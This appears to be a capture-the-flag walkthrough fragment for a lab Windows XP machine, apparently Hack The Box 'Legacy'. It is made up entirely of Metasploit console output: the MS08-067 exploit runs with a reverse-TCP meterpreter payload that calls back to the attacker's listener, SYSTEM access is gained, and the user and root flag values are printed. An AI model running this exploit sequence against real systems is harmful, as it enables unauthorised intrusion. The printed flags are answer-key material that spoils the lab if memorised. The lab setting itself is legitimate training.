
```sh
msf6 exploit(windows/smb/ms17_010_psexec) > search ms08-067

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   1     \_ target: Automatic Targeting                                 .                .      .      .
   2     \_ target: Windows 2000 Universal                              .                .      .      .
   3     \_ target: Windows XP SP0/SP1 Universal                        .                .      .      .
...
...

msf6 exploit(windows/smb/ms17_010_psexec) > use 0
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 2+ - lang:English
[-] 10.10.10.4:445 - Could not determine the exact service pack
[-] 10.10.10.4:445 - Auto-targeting failed, use 'show targets' to manually select one
[*] Exploit completed, but no session was created.


msf6 exploit(windows/smb/ms08_067_netapi) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic Targeting
    1   Windows 2000 Universal
    2   Windows XP SP0/SP1 Universal
    3   Windows 2003 SP0 Universal
    4   Windows XP SP2 English (AlwaysOn NX)
    5   Windows XP SP2 English (NX)
    6   Windows XP SP3 English (AlwaysOn NX)
    7   Windows XP SP3 English (NX)

msf6 exploit(windows/smb/ms08_067_netapi) > set target 5
target => 5

msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.4       yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                       oit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.9       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   6   Windows XP SP3 English (AlwaysOn NX)

View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.4:1033) at 2025-05-08 18:21:49 +0200

meterpreter > 
```

```sh
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

```sh
meterpreter > search -f user.txt
Found 1 result...
=================

Path                                             Size (bytes)  Modified (UTC)
----                                             ------------  --------------
c:\Documents and Settings\john\Desktop\user.txt  32            2017-03-16 07:19:49 +0100

meterpreter > search -f root.txt
Found 1 result...
=================

Path                                                      Size (bytes)  Modified (UTC)
----                                                      ------------  --------------
c:\Documents and Settings\Administrator\Desktop\root.txt  32            2017-03-16 07:18:50 +0100

meterpreter > shell
Process 1288 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>type "c:\Documents and Settings\john\Desktop\user.txt"
type "c:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f

C:\WINDOWS\system32>type "c:\Documents and Settings\Administrator\Desktop\root.txt"
type "c:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713
```